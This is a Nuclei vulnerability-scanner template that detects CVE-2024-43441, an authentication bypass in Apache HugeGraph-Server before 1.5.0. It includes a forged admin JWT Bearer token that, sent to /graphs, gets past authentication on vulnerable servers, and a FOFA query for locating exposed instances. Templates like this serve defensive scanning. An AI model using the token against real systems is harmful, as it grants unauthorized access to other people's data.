flow: http(1) && http(2)
http:
- matchers:
  - dsl:
    - status_code == 401
    internal: true
    type: dsl
  raw:
  - 'GET /graphs HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains_all(body,"graphs", "hugegraph")
    - contains(header, "application/json")
    type: dsl
  raw:
  - 'GET /graphs HTTP/1.1

    Host: {{Hostname}}

    Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX25hbWUiOiJhZG1pbiIsInVzZXJfaWQiOiItMzA6YWRtaW4iLCJleHAiOjIwNzE0NzY4MzB9.vb193qf4xpIPFcmCN8J0sRwqUaoS2RAUvFx9uLC-I7Q

    '
id: CVE-2024-43441
info:
  author: wn147
  classification:
    cve-id: CVE-2024-43441
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-302
    epss-percentile: 0.98625
    epss-score: 0.70462
  description: 'Apache HugeGraph-Server versions prior to 1.5.0 contain an authentication
    bypass vulnerability caused by assumed-immutable data. This flaw allows attackers
    to bypass authentication mechanisms without requiring specific privileges or user
    interaction.

    '
  impact: 'Attackers can bypass authentication, gaining unauthorized access to sensitive
    data or functionalities.

    '
  metadata:
    fofa-query: title="HugeGraph"
    max-request: 2
    product: hugegraph
    vendor: apache
    verified: true
  name: Apache HugeGraph-Server <1.5.0 - Authentication Bypass
  reference:
  - https://github.com/advisories/GHSA-f697-gm3h-xrf9
  - https://github.com/apache/incubator-hugegraph/commit/03b40a52446218c83e98cb43020e0593a744a246
  - https://lists.apache.org/thread/h2607yv32wgcrywov960jpxhvsmmlf12
  - http://www.openwall.com/lists/oss-security/2024/12/24/2
  - https://github.com/J1ezds/Vulnerability-Wiki-page
  remediation: 'Upgrade to Apache HugeGraph-Server version 1.5.0 or later.

    '
  severity: critical
  tags: cve,cve2024,hugegraph,auth-bypass,apache,vuln
